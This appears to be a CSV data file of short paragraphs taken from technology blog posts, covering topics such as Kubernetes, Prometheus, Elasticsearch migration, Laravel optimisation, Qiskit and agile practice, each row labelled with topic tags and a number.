1081,"The servers generated HTML for that view does not have to provide the means of accessing all the other possible views. It could maybe render a window view, a subset of all possible thumbnails. It can render links around the current view, but not necessarily links to all possible other views. Maybe it shows thumbnails like this, with gaps that would need an additional navigation step to land in:[] []. [] []And if structural content such as chapter information is available, the page HTML provides a partially expanded navigation tree, but not the whole tree if its going to be too big. A user can navigate upwards and downwards and around, but might need two page navigations to get to every possible other view, via additional aggregate views of the content. The server end of the exploded viewer is capable of rendering these supporting, aggregate views to aid navigation around the work.","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1082,"The exploded viewer is not the answer to every use case. It only works when the client and server are in close collaboration. But thats the scenario when progressive enhancement, accessibility, addressability and findability are most importantlikely in an organisations primary discovery environment. Self-contained viewers are a better answer everywhere else. But we dont have to sacrifice the UI sophistication of those Java Script applications to get the URL schemes, accessibility and support for every single web user that we must provide in those discovery contexts. This for me is the holy grail; a viewing experience that: Solves the problem of focusit can be used for page focus and work focus Works with no Java Script, butwhen it can, it feels like a viewerreally feels like a viewer, for search and other functions too Is search-engine-friendly, at the page level Makes sense for single-image items as well as multiple image items Yields a viewing experience immediately without loading heavy Java Script applicationsbut does not yield a heavy HTML page with markup for the whole object at once (unless the object is small enough).","['Web Development', 'User Experience', 'Digitization', 'Iiif']",19
1083,"To increase isolation inside the container, security modules like SELinux or App Armor could be used. Unfortunately, such kernel-based security mechanisms will not prevent kernel-based escape attacks. It would only restrict an attackers actions if an escape cannot be achieved. If we want to tackle container escapes we need some isolation mechanism either outside the container or even the kernel. A sandbox for instance!g Visor is a container runtime sandbox open-sourced by Google which adds an additional kernel between the container and the OS kernel. This type of sandbox could mitigate container escape attacks which are kernel-based. For an attacker however, kernel exploits are just one thing of whats available in the toolbox.","['Docker', 'Kubernetes', 'Containers', 'Architecture']",7
1084,"Youve just co-authored (with Justin Domingus) a book entitled Cloud Native Dev Ops with Kubernetes: Building, Deploying, and Scaling Modern Applications in the Cloud. From the description of the book, it looks like it can take you from zero to hero in building and scaling apps the Kubernetes way. What do you think makes this book stand out from other books on the topic available on the market? Its the book that Justin and I wish wed had when we started trying to deploy real apps on Kubernetes! The first and most important introductory book on Kubernetes that anybody should read is Kubernetes Up And Running, by Kelsey Hightower, Brendan Burns and Joe Beda. But what should come after that? We wanted a book that answers the question OK, I have Kubernetes; now what do I do with it? We found lots of great tutorials and introductions and blog posts explaining how to set up a simple Kubernetes cluster. But it seemed like as soon as we started asking hard questions, the blog posts dried up.","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",10
1085,"How would you define the ideal reader of the book? A senior developer that wants to learn about Kubernetes? A CTO who wants to get a bit more than the general overview of Kubernetes and its purpose? Or is it targeted at people with hands-on experience that will put the theory into practice? We discussed this a lot in the planning stages. Its important to know your audience, or you may finish writing the book and find no one wants it.","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",6
1086,"This almost sounds as if Dev Ops is a solution to a lot of issues connected with company culture. Could you tell us a bit more about this approach and why aligning your companys culture with Dev Ops best practices can increase happiness inside the company and create business value? Lets leave aside the term Dev Ops for a moment and think about specifics. Dev Ops is often associated with infrastructure as code. We have lots of great tools and practices in software engineering that we can use to collaborate on developing code, to learn and share knowledge across teams and to ship reliable, maintainable code. Now that more and more infrastructure is defined, provisioned and managed by code; whats the real difference between that code and the application software that the infrastructure is there to support?","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",12
1087,"We talk a little in the book about the future of operations teams. Kubernetes can automate many of the processes that kept ops people busy in the past, but that doesnt put them out of a job. Instead, they can now do more interesting work, rotating around development teams bringing their knowledge and experience to bear on high-level problems, teaching and coaching, designing and maintaining internal tools and platforms. These are some very smart and skilled people. If parts of their work can be automated, that means theyre free to do things which bring more value to the business. Theyll also be happier and more fulfilled, which is what every manager wants for her team, isnt it? If your company doesnt look like what Ive described, its worth taking some time to think about why not. Talk to your people and find out what they want. Ask them what would need to change to make them excited about coming to work. If they sense that youre genuinely interested in fixing a broken culture, you may find youve got all the help you need, right there in your own team.","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",10
1088,"Youve been in the industry for some years now and how would you describe the current state of developers sharing responsibilities with their infrastructure colleagues? Does it work the other way roundwith infrastructure teams doing pair programming with their dev teams? The future is already here, as William Gibson noted; its just not evenly distributed. I know, and have worked with, many teams that are really flying high. They have wide-ranging and complementary skill sets, covering all aspects of development and operations. Theyre constantly teaching and learning from each other, by pair programming, code reviews and other means. They collaborate in powerful ways, making sure everybody sees the big picture as well as the tiny piece theyre working on, and making everybody feel involved in decisions. Instead of little code fiefdoms, stoutly defended by local warlords, and which no one else dare touch, theres a sense of collective ownership. When you feel valued, and youre thoroughly invested in the success of what youre all building together, theres no need for consultants anymore.","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",12
1089,"With Kubernetes being complex and giving birth to many follow-up-ecosystems plus the entire cloud native technology landscape growing at an incredible speed is it even realistic to demand from development teams to keep up with the upcoming novelties in how the software they build can be deployed and maintained? Its all about dividing responsibilities between teams, but this again might lead to working in silos. Is it possible to close the loop between people who create software and deliver it? Can everybody know everything about everything? No, indeed, and they shouldnt try. I have a general idea of how engines work, and I know enough to be able to drive my car to the store and back. But I couldnt build an engine, nor could I discourse insightfully on the relative merits of gasoline, hybrid, or even Wankel rotary engines.","['DevOps', 'Kubernetes', 'Continuous Delivery', 'Cloud Native']",10
1090,"Fatigue model Fatigue happens when a Pinner becomes tired of viewing the same ad. This usually has negative impact on CTR (click-through rate). Our ads system has a training pipeline for the fatigue model for p CTR (predictive CTR). At the request time, several user counting features are fetched for the user fatigue model. A Pinners fatigue is measured at different campaign levels. Our campaign structure has four levels: Advertisers: the account Campaigns: houses of ad groups Ad groups: container of Promoted Pins Promoted Pins: ads The required actions are impressions and clicks. First, our ads serving system fetches a Pinners past engagement counts over a time range for a list of ads candidates at four campaign levels. Then, the counting features are fed to fatigue models for CTR prediction.","['Adtech', 'Ads', 'Rocksdb', 'Infrastructure', 'Engineering']",6
1091,"Aperture implements data storage schema and serving functions for time series event data at the user level. It abstracts a single event as a byte array with a predefined length. The event can be an ID or list of fields. Logically, a record is a key-value pair of a user and all events of the user in the past. As Rocks DB retrieves and stores at the record level, storing all events of a user as a single record incurs high cost for the time range queries. Ideally, only events of the queried time range are supposed to be fetched from the disk.","['Adtech', 'Ads', 'Rocksdb', 'Infrastructure', 'Engineering']",8
1092,"Antifragility is beyond resilience or robustness. The resilient resists shocks and stays the same; the antifragile gets better. Nassim Nicholas Taleb, Antifragile: Things That Gain from Disorder Have you ever been on a project where every customer request seems to make the software better? When you look forward to meetings with beta testers and enjoy hearing from your product owner? Where new features seem to enhance the old ones, producing a sort of synergy? If this describes a place you have been then congratulations you have experienced antifragile software development.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",12
1093,"Have you been on projects where you have long detailed unit tests? Tight test coverage rules, detailed simulators and mocking frameworks? Thorough code review rules and developers who pour over every minute decision like where a reduction is preferred over a fold? Code review meetings that go on for hours, github reviews that go for days or weeks with dozens or even hundreds of comments? With all these controls did it seem like the addition of a feature that takes only tens of lines of code could take hundreds of modifications to unit tests and hours of discussion about every detail and design decision? If this describes where you have been then congratulations you have experienced robust software development.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",13
1094,"Ive already discussed my views on unit test coverage as a means of achieving robustness. If the coverage number is the incentive then the outcome is code that can raise coverage and not software that has fewer bugs and is flexible to change. Testing written to encapsulate the specification or requirements of the product, however facilitate antifragility. If tests not only execute the individual branches and lines of code but they describe how the software behaves, how it reacts to adverse inputs or how it interacts directly with other systems or components they also serve as documentation for the developers. When new specifications are added the tests themselves and the development procedures that produced the tests serve to strengthen the product. Tests, however are not the way to achieve antifragility.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",13
1095,"The first principle may be very familiar if you are familiar with Uncle Bobs clean code. Single responsibility principle of functions (SRP) for instance is a guiding principle of micro design of software. Writing functions that do one thing writing objects that tell a single story are central concepts for modern software engineering. The next step is to apply SRP to components (this is the central focus of microservice architecture, serverless, etc). When you see a single component as a fully functional building block it becomes part of the whole. When you design your product with this in mind you unlock the ability to both reuse all your work developing the individual components but you also unlock the ability to change non-functional requirements without redesigning unrelated parts.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",9
1096,"A straightforward interface can be the difference between a software component that takes a life of its own or one that beguiles engineers for decades. Techniques like Representational State Transfer (REST) and messaging strategies like Remote Procedure Call (RPC) are some that have a great deal of traction and for good reason. Well designed interfaces all have one thing in common and that is they are descriptive and built from data. Whether it is a JSON object, a SOAP class or a protobuf using data to describe the interactions between components gives the system engineer options and increases the antifragility of a system. When features are added to a component, other components can continue to operate and be changed as needed as additional fields can be omitted as the interface grows. If components are designed with additive only data contracts (E.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",9
1097,"The final method of generating antifragile systems may be a concept new to some object oriented developers but is a central concept in functional programming. A system is said to be stateless if it doesnt store data about previous inputs. At the microscopic level stateless system are built with functions that are pure, functions that yield output only determined by the input. Unfortunately outside of simple mathematical machines most problems require state. Whether it is storing a students name or progress they have made on a given assignment useful systems are built around handling and managing state. The technique that raises the antifragility of a system is when this state is encapsulated properly. This can mean that although all components need to react to user settings only one component can change it, one component owns that state. The more this principle is followed, that for a given data in a system only one component has ownership of it, the system can now grow each time that data is augmented. If the assignment status component is the sole owner of progress both the teacher view and the student view need not be reconciled. When the administrator role is added to the system to track statistics about all assignments no modification of the teacher or student sub systems need to occur. The component that owns assignments can simply grow its interface to address the new requirements and the rest of the system can continue to function unaltered.","['Software Development', 'Antifragile', 'Software Engineering', 'Functional Programming']",5
1098,"Recently, I got greeted by an unusual message while searching on Google. It was Googles secret hiring challenge! I first heard about the existence of the Google foobar challenge since a friend of mine, Vampiire, got it last year. Because of the referral system inside foobar, a lot of members of Chingu team got to enter this challenge. One of them even got an on-site interview at Google! I tried to forcibly make it trigger but it didnt work like that. I forgot about it, just continued with life and coding. Then one day, it suddenly appeared on my screen! It is a secret hiring challenge from Google which you get when you match some search behaviour on Google search or their documentations. You are given a prompt and if you accept, you are moved to an online shell where you can request questions and solve them. If you complete the challenge you have a high chance of being contacted by a Google recruiter! The challenge had 5 levels, with each level having questions related to graphs and maths.","['Coding', 'Google', 'Tech']",6
1099,"The fourth level was quite intense! I was given two weeks for each problem. The problems needed multiple concepts ranging from number theory to graphs. max flow and maximum matching were needed to finish the level 4 section of the challenge. Implementing these made me reference CLRS book, which is short form for Introduction to Algorithms, a great book to learn about algorithms. You also get another referral link here to give to a friend.","['Coding', 'Google', 'Tech']",14
1100,"This book helped me better understand the building blocks that led me to discover how to count unique permutations of some system along given symmetries. I had to study for three days straight to understand Burnsides Lemma, which can be used to form an equation for counting unique permutations for the given system. This video helped me a lot when I was just getting started on the problem. I had taken a risk and I didnt want to lose to this challenge. Following the books procedure and hacking together a solution, I cleared the fifth and final level! I got a secret string which looked like base64, decrypting is quite easy as there are many gists. The decrypted text wasnt very important though. I tried doing some curls using that json but there was no hidden easter egg.","['Coding', 'Google', 'Tech']",5
1101,The format of questions were same again but interestingly no questions repeated. The questions were actually very easy in this run. I went flying through all the questions this time in about 2 weeks. It had taken me a month in previous run. Meanwhile I gave the referral to a friend of mine and he completed foobar challenge in just 3 days! Overthinking can make you use algorithms that might be overkill. For one question I went on to implement Edmunds Blossom algorithm while all I needed was a simple depth first search based bipartite matching. All the questions in foobar are mostly solvable in under 400 lines of code.,"['Coding', 'Google', 'Tech']",14
1102,"Agile teams should be vertical and cross-functional. These should be end-to-end teams made up of all of the skills & roles required to deliver a feature from inception to use in production without external dependencies. This means software developers, front-end experts, product experts, customer proxies, Quality Assurance engineers, database experts, Dev Ops, and UX experts all working together on the same cross-functional team. When roles get moved out of cross-functional teams, overhead and handoffs are introduced. This often results in teams operating in violation of agile principles and values. Understand that these are roles and not necessarily individuals. Members of the team may play multiple roles.","['Agile', 'Technical Leadership', 'Extreme Programming', 'Scrum', 'Software Engineering']",12
1103,"Another concern is that these cross-team projects have no experts as the expertise is spread across multiple teams. There should be one team, who are experts in their area of work. When expertise is split across multiple teams: All system changes need to include input from every team Incorrect features get implemented Low value or no value work gets focus Internal and external quality issues arise Delivery and team productivity is affected The other mistake I see organizations make, is their need to have teams be the same. These organizations require teams to have identical processes and practices. They cant be solely faulted for this idea since agile trainers will often make this recommendation. Unfortunately, this oversimplification has lasting negative effects on organizations.","['Agile', 'Technical Leadership', 'Extreme Programming', 'Scrum', 'Software Engineering']",12
1104,"After the dev proc is finished, it will be reviewed by a manager or another senior engineer where they propose additional changes. This is an opportunity to point out security flaws and validate how well the solution will work within the software architecture. Once all changes are agreed upon, the dev proc is approved. After approval, the proc is sent off to be implemented by the team responsible. The author will create JIRA tickets based on the relevant dev proc sections and assign out the work to fellow team members. This can be tailored to your specific workflow management software or process.","['Software Development', 'Management', 'Agile', 'Process']",13
1105,"JSON file is a text file which describes what has happened. For instance, it may contain information about that user called Mary has started the game at 23:00 on November 15. How to describe each possible action? If a user clicks the button, which properties should be collected? There are properties of 2 types: Super-properties which are common for all the events and are always present. These are definitely the date and timestamp, device id, API version, OS version, analytics service version. Event-specific properties which are arbitrary and should be selected with attentiveness. For example, for a button Buy coins in a mobile game these properties would be Number of bought coins and How much the coins cost.","['Analytics', 'Customer Analytics', 'Mixpanel', 'Programming', 'Google Analytics']",15
1106,"Very simple service can be integrated within hours (Yandex App Metrica, for instance) and will provide you with the basic metrics without any custom events. Time needed for complex service integration depends on the events you are interested in. Also, some difficulties which would require additional development may arise. Possible difficulties: If the events are ordered strictly, how to fix this order and the fact that one event can never come to analytics earlier than another? What if the user has changed time on his mobile phone? How to collect the occurred events in case a user lacks Internet access? On average, Mixpanel may be configured in a couple of days. If you are planning to specify and then collect loads of specific events, it may take up to a week.","['Analytics', 'Customer Analytics', 'Mixpanel', 'Programming', 'Google Analytics']",6
1107,"Next, lets switch to Facebook analytics. It unions website or app visitor with his Facebook profile. You can explore your audience and whats more important you can convert it into ad audience easily. Suppose I visited a website which Ive never seen before. Later on, if the service owner switches on the ad company, ads will be shown to me on Facebook. For you, as a service owner, it is very easy to use. The only thing you should not forget is to set your ad budget daily cap.","['Analytics', 'Customer Analytics', 'Mixpanel', 'Programming', 'Google Analytics']",17
1108,"The first is often the price. Usually, such services are paid for by period. A mobile game startup may pay about $50k per month to get all the insights needed for further development. And if you try to save your money and choose free solutions, you will get a very limited feature set to use. Analytics will not be detailed: youll see customer device types and operating systems but will not be able to look at specific events or create funnels.","['Analytics', 'Customer Analytics', 'Mixpanel', 'Programming', 'Google Analytics']",6
1109,"Generally, almost every analytics service limits your access to raw data. That is, on the whole, the main disadvantage of the concept of client analytics: you can never run your own models on your own data. Therefore, you will not be able to study user sessions fully. Another thing is complicated customer aggregation. For example, studying your website sales funnel stages in Mixpanel you would only be able to calculate the mean time between stages. Any other metric, say, median time or percentiles will not be available to learn using this service.","['Analytics', 'Customer Analytics', 'Mixpanel', 'Programming', 'Google Analytics']",8
1110,"How does the company really measure a successful marketing launch? Is it namely on new leads that are generated and delivered into the sales funnel? Or is it the uptake in the usage of the functionality from existing users? Are those two measured with equal weight, or is it skewed towards one or the other? Are they measured by totally different departments that dont even talk about those metrics to each other? Being clear with how the marketing campaign is being measured can open the door for engineers to help.","['Product', 'Product Marketing', 'Marketing', 'Software', 'Software Development']",1
1111,"Here are some things to think about as an engineer: Dont feel pressured to give an exact date if it is currently impossible to do so. Instead, the engineering team could give an estimated month, or even a quarter. That doesnt prevent marketing from planning their work; they can get on with it just the same. As time progresses and the estimate of a quarter becomes a clearer estimate of a month, then specific dates can be discussed. The worst thing to do is to give an exact date in the distant future that you cant stick to. Thats where youre putting both yourselves and the marketers under pressure.","['Product', 'Product Marketing', 'Marketing', 'Software', 'Software Development']",1
1112,"The ground state |0 is the default, so an X gate is used on qubits that must start in the excited state |1. The X gate performs a pi radian rotation about the X-axis, which rotates |0 (a.k.a. |+z) through the Y-axis to |1 (a.k.a. The X gate is sometimes called a NOT gate, but note that it performs a pi radian rotation that happens to perform a classical NOT, or bit flip, only when the qubit is in |0 or |1 state. To change the input, comment out the X gate operation on any qubits that should be |0 and ensure the X gate is not commented on any qubits that should be initialized to |1.","['Quantum Computing', 'Qiskit', 'Ibm Q', 'IBM']",3
1113,"We target qubit q3 with a controlled-Hadamard operation that is controlled by the source qubit q0. This changes the target q3 from |0 to |+x if the source q0 is |1. The operation looks like this on the Bloch sphere: Operation 2. Next, we target qubit q3 with a controlled-Z operation that is controlled by the source qubit q1. This changes the phase of the target q3 by rotating pi radians around Z-axis if the source qubit q1 is |1. The operation looks like this on the Bloch sphere: The following are the results so far: For input q1 q0 = |0 |0, q3 is not changed from |0For input q1 q0 = |0 |1, q3 only changed to |+x For input q1 q0 = |1 |0, q3 is at |0 because q0 did not rotate it, and q1 requests a Z-axis phase rotation, but |0 is along the Z-axis, so rotating it does nothing.","['Quantum Computing', 'Qiskit', 'Ibm Q', 'IBM']",3
1114,"In this notebook, we have demonstrated how quantum algorithms use quantum operations to coerce qubits into representing the outcome or outcomes that satisfy the constraints of a problem. In the case of quantum addition of two qubits initialized with classical bit values, one output qubit had to satisfy the constraint of being excited if and only if the two input qubits differed, and a second output qubit had to satisfy the constraint of being excited if and only if both input qubits were excited. Not only did we simulate this quantum circuit, we ran it on a real IBM Q quantum computer. When we did, we witnessed the fact that in the NISQ era, one plus one is most probably two! Finally, note that the quantum logical AND method we built above is also signicant because one can append an X gate, which performs a logical NOT, resulting in a NAND operation. In classical cmputing, the NAND operation is a universal gate that can be used to build all other classical computing circuits. Therefore, any classical computing solution can be expressed and we have only used 4 points of the Bloch sphere representing the total expressive power available to each qubit of a quantum computer.","['Quantum Computing', 'Qiskit', 'Ibm Q', 'IBM']",5
1115,"Most UML tools allow you to convert a diagram to a code snippet in some object-oriented language and vice versa. It basically means that the resulting diagrams are almost as complex as their implementations. But we still need a language to express and discuss our ideas before any coding is even started. The goal of No UML is to curb this complexity of Software Architecture diagrams. So, I promise you that no drawing tool would be able to generate a code template from a No UML diagram. With No UML you are going to deal with abstractions in their purest form.","['Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
1116,"But how can listen relation be the same thing as emit after update? Do not let the misleading names on No UML diagrams to trick you. When analyzing No UML diagrams look at abstractions and their relations without paying too much attention to their labels. In this particular case the relation is more complex than just listening to some events. Presenter takes some actions about these events by updating View and Model so it needs to break endless cycles by filtering events about its own updates, for example. In case of MVP the name of this relation does not convey the whole story.","['Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
1117,"We know that for every abstraction there also always exists id relation between the abstraction and itself. If the abstraction is an object we call it this. So, we want get Instance after is to be this relation between Singleton Implementation and itself. The id relation can only be is relation whereas get Instance after is must be uses according to uses Transitivity Rule. There must be some undesirable irregularity about get Instance after is than just simply referring to Singleton Implementation through this.","['Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
1118,"So, now when we found the undesirable irregularity, lets investigate it. Lets look how Singleton is supposed to be used by other classes: We added uses relation between some Client and Singleton Interface but now we have another undesirable transitive relation: get Instance after uses. Somehow get Instance doesnt belong to Singletons public Interface. What would happen if we decide that Singleton class can no longer be a Singleton and remove get Instance method? It will break all Singletons users. Singletonicity is an implementation detail of Singleton class. It has to be encapsulated and hidden.","['Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
1119,"This is my first article in No UML series. You can read the next one here: No UML with Levels of Abstraction[1] Martin Fowler. [2] Grady Booch, Robert A. Maksimchuk, Michael W. Engle, Bobbi J. Young, Jim Conallen and Kelli A. Houston. Object-oriented analysis and design and with applications, 3rd ed., 2007. p 88, 96, 138. [3] Grady Booch, Ivar Jacobson and James Rumbaugh. Unified Modeling Language Reference Manual, 2nd ed., 2004. Patterns of Enterprise Application Architecture, 2002. p 1922. [6] Andy Bower, Blair Mc Glashan. The evolution of the Dolphin Smalltalk MVP application framework. [7] Erich Gamma, Richard Helm, Ralph Johnson, John Vlissides. Design Patterns: Elements of Reusable Object-Oriented Software, 1st ed., 1994. p 87, 127. Inversion of Control Containers and the Dependency Injection pattern, 2004.","['Uml', 'Software Architecture', 'Software Design', 'Software Design Patterns']",9
1120,"The following image depicts such an architecture and let it guide us in our such blockchain application development endeavor: Part One Hyperledger Fabric Network Infrastructure This part involves working with stakeholders as the network participants or distributed nodes/peers, along the way, creating and/or setting up rules and policies. Using cryptographical tools to create keys, secure identities, roles etc. Using a special service called orderer to facilitate communication among peers and data transaction processing. And much more For this tier, an extensive computing background including skills in Unix/Linux/Ubuntu, Docker (containerization) etc. Its complex and yet not much programming needed.","['Docker', 'Blockchain', 'Hyperledger Fabric', 'Distributed Ledgers', 'Entrepreneurship']",10
1121,"Chaincode coding-wise, a great way to learn is to read and understand sample chaincode. Both Balance-Transfer sample app and Fabcar sample app are good examples. The important thing is a willingness to experiment with or tweak with them, thus, we would gain new understanding or even some sort of discovery. For instance, for the First-Network sample app, the Instantiate actually writes data to the chain while the Instantiate for the Fabcar sample app does not. Thus, we know that Instantiate can be written in a way that fits our needs better vs. it must do this or that.","['Docker', 'Blockchain', 'Hyperledger Fabric', 'Distributed Ledgers', 'Entrepreneurship']",15
1122,"In this article, we discuss Prometheus because it is open source software with native support for Kubernetes. Monitoring Kubernetes clusters with Prometheus is a natural choice because many Kubernetes components ship Prometheus-format metrics by default and, therefore, they can be easily discovered by Prometheus. Were going to overview the Prometheus architecture and walk you through configuring and deploying it to monitor an example application shipping the Prometheus-format metrics. Prometheus is an open source monitoring and alerting toolkit originally developed by Sound Cloud in 2012. Since then, the platform has attracted a vibrant developer and user community. Prometheus is now closely integrated into cloud-native ecosystem and has native support for containers and Kubernetes.","['Kubernetes', 'Prometheus', 'Monitoring', 'Metrics', 'Logging']",10
1123,"Prometheus collects metrics via a pull model over HTTP. This approach makes shipping application metrics to Prometheus very simple. In particular, you dont need to push metrics to Prometheus explicitly. All you need to do is to expose a web port in your application and design a REST API endpoint that will expose the Prometheus-format metrics. If your application does not have Prometheus-format metrics, there are several metrics exporters that will help you convert it to the native Prometheus format. Once the /metrics endpoint is created, Prometheus will use its powerful auto-discover plugins to collect, filter, and aggregate the metrics. Prometheus has good support for a number of metrics providers including Kubernetes, Open Stack, GCE, AWS EC2, Zookeeper Serverset, and more.","['Kubernetes', 'Prometheus', 'Monitoring', 'Metrics', 'Logging']",11
1124,"In its turn, the scrape config section defines jobs/targets for Prometheus to watch. Here, you can override global values such as a scrape interval. In each job section, you can also provide a target endpoint for Prometheus to listen to. As you understand, Kubernetes services and deployments are dynamic. Therefore, we cant know their URL before running them. Fortunately, Prometheus auto-discover features can address this problem.","['Kubernetes', 'Prometheus', 'Monitoring', 'Metrics', 'Logging']",7
1125,"As we need to snapshot from ES2, and restore to AES5, we first registered the S3 repo in both clusters, and then tried to take the snapshot. The snapshot is taken fine in ES2, but then we could not see it from AES5. We tried registering it as read only from AES5, to no avail. It turns out that as soon as you register the repo in ES5, it changes its format to a new one, so the snapshot later added by ES2 is not seen by the new format. After a lot of back and forth, what worked for us is this sequence:register the repo in ES2take the snapshotregister the repo in AES5, read-only. The order is important here, from this point on you cannot see any new snapshot taken from ES2, so you have to make sure the snapshot is fine before doing thisrestore it in AES5Also, as we need to do two _snapshot/_restore operations (to go from ES2 to AES5 and to go from AES5 to AES6), we use two different repos, just to be on the safe side, as it is problematic to mix different ES versions accessing the same repository. This might be overzealous, but it is a small cost, and better safe than sorry.","['Elasticsearch', 'Amazon Web Services', 'Migration', 'DevOps', 'Cloud Services']",18
1126,"Is there some way to make this work in AES? The same way we updated number_of_replicas while restoring, we can change the synonym filter on the fly. It is a bit more complex than just changing a value cause we need to set synonyms and unset synonyms_path, but this works: With these settings we can restore the snapshot into AES5.5. It is now time to create the ES5 index in AES, and reindexing to it. As we are coming from ES2, some types have changed, so we have to modify the mappings to account for them. I like to take the existing ES2 settings/mappings from ES itself (instead of files checked into Git for example), the reason for this is to be make sure we use the real deal, and to account for dynamically added fields.","['Elasticsearch', 'Amazon Web Services', 'Migration', 'DevOps', 'Cloud Services']",15
1127,"At this point we can create the index with the right settings/mappings in one go (the json files contains both): We are ready to reindex to new AES5. One of the most important optimizations for reindexing performance is setting refresh_interval to -1 while reindexing. So we store current value (to restore later) and set it: We did try some other optimizations like slice or __url__ but they did not make a difference, so we left them at default values. Now we can reindex: At this point, we have our data in an index created on AES5. Now we can delete the temp index: We are close to the end. Just snapshot in ES5 and restore to ES6 (with all precautions mentioned above). Butwhen we restore, we hit this: That synonyms_path again, but why the error now? Lets investigate, it turns out, our index settings are like this right now:synonyms_path is empty, and in ES5 synonyms values was taken correctly, and synonyms_path was ignored, but in ES6 something changed and it causes the issue above, synonyms_path is taking precedence. The solution means going back a number of steps, to where we modified the settings to create the new AES5 index, and removing this synonyms_path value: We continue from that point onward the same as before, and now the snapshot is restored fine to ES6.","['Elasticsearch', 'Amazon Web Services', 'Migration', 'DevOps', 'Cloud Services']",15
1128,"With the dictionary stored as a DAWG and the tiles of the board stored as a graph, solutions can be found by simultaneously performing depth-first search on the DAWG and from each letter on the board. Due to the rules of Word Streak, each tile can only be visited once; so, a list of visited tiles needs to be stored. The possible paths from each tile are therefore to the set of neighbours of the current tile, subtract the set of visited tiles. If the current string is a solution, then it will be contained in the DAWG and can be created on the board in legal moves. If the current string is the prefix of some word in the DAWG, then the next possible paths can be explored recursively; determining whether the current word is a prefix in the DAWG only requires checking whether the last node pointed to by the edges so far has any further edges leaving it. If the current string is not the prefix of any other words in the DAWG, then no further recursion is necessary. This structure is the same as that of depth-first search.",['Programming'],14
1129,"I got around this for Active Record Doc by adding a Safe Log Ruby function that would chunk the output if a single line exceeded 10,000 bytes. Docker provides a mechanism for defining, instantiating, and maintaining isolated execution environments. We think of Docker containers as heavier weight than processes, but lighter weight than true virtual machines. They excel at helping us run CI, generate reproducible environments, and better utilize host resources for deployed apps. Because they are not completely isolatedfor example, sharing UIDS/GIDS with the host system (but only on host systems like Linux that support UIDs/GIDs)they can be challenging to durably use when orchestrated.","['Docker', 'Continuous Integration', 'Infrastructure', 'Engineering', 'Software Development']",7
1130,"So heres a short explaination how Git Lab, Docker and Laravels Envoy are working together to put your code at your web server. When pushing new commits to Git Lab, it will instruct a CI/CD runner to spin up a new Docker container that is defined by the Dockerfile in your projects root. In here a PHP 7.1 basic image is used, some packages (like Git) are installed and composer is downloaded. So basically everything that Laravel requires is in there. You could now do anything you want with your Laravel application. In the first step phpunit and other toolchains are executed to test your latest code inside the Docker container. If this job is successful the Docker environment is teared down and will build up again when you trigger the production job. Again thanks to the Dockerfile there will be all packages present youll need to push your app into production using the Laravel Envoy Task Runner. It relies on PHP and on some basic Composer packages and will execute all commands you need to get the latest code on your server.","['Laravel', 'Laravel 5', 'Web Development', 'PHP', 'DevOps']",7
1131,When developing locally you may not waste a thought on optimised code at first. And it practially wont even matter in your local environment. But now think about the consequences when putting your application into production. Not only you but many usersmaybe hundreds or thousandswill use your application. Now you can just scale up your server infrastructure to handle all the concurrent requests or you could optimise your code to allow your code to be executed more often on less performant infrastructure. This could save you a lot of money.,"['Laravel', 'Laravel 5', 'Web Development', 'PHP', 'DevOps']",9
1132,Queries are putting a lot of load on your database servers. First step to optimise your code would be to simply reduce the amount of database queries your application executes. Grab yourself the Laravel Debugbar (One of the most useful Laravel packagesdeveloped by Barry vd. Heuvel) and check your data intensive pages for the amount of queries. You will probably be suprised how many similar queries are actually executed more than once. There are a many ways to minify this amount of queries down to one or two. I wont spend time on explaining the exact process of doing so when theres already an outstanding video tutorial about exactly this thematic by Laracasts. Make sure to check it out.,"['Laravel', 'Laravel 5', 'Web Development', 'PHP', 'DevOps']",19
1133,"Route Caching: php artisan route:cache Config Caching: php artisan config:cache Composer Autoloader Optimisation: composer install --optimize-autoloader Sometimes I have the feeling that queue-able Jobs and Notifications are the most underrated features in Laravel. But in fact they are pretty awesome. Think about the following situation: Your customer is placing an order at your Laravel-based web shop and clicked on the Buy now button. What is your application going to do? Probably a hell of things, like for example: Sending a confirmation e-mail to the customer Sending a notification to your Slack channel Adding the order to the database(and much more)But while you are doing all this, your user expects to be redirected to a Order has been placed-page. Now think about the worst case: The page is loading and loading as there are problems with your e-mail server and after lots of waiting your customer gets a HTTP Error 500 due to a Timeout Exception of the mailer class in your application. This would be pretty bad for your shops reputation. But even if you look at the normal case where it would take a few seconds to get connected to your SMTP server or to the Slack API your user is waiting those seconds.","['Laravel', 'Laravel 5', 'Web Development', 'PHP', 'DevOps']",19
1134,"Managers will, of course, lose developers. Even the biggest and best companies cannot and do not retain every single developer. However, when a developer does leave, it is important to understand the reason why. If it is due to a lack of somethingespecially motivationthen managers do not want to let all of the talent feel this way and leave. Ultimately, its the managers responsibility to stay on top of workers motivation.",[''],12
1135,"Motivating a team can be quite simple. One core element is creating an enjoyable office environment. For example, managers can extend invites for Friday night beverages. Or offer a team lunch down at a local bistro. Keep in mind: not all employees are keen on evening social events as they may have family commitments, long commutes, or just dont want to stay out. This shouldnt be frowned upon, but switched to lunchtime team get-togethers instead. There are developers who do not participate much in social events but they love being part of the team because they get on well with everyone and enjoy working alongside them.",[''],0
1136,"Its fairly easy to check min, max and median duration in Spark UI. Here is a balanced example: There is no universal answer when choosing what should be cached. Caching an intermediate result can dramatically improve performance and its tempting to cache a lot of things. However, due to Sparks caching strategy (in-memory then swap to disk) the cache can end up in a slightly slower storage. Also, using that storage space for caching purposes means that its not available for processing. In the end, caching might cost more than simply reading the Data Frame.","['Big Data', 'Apache Spark', 'Optimization', 'Tips And Tricks', 'Best Practices']",8
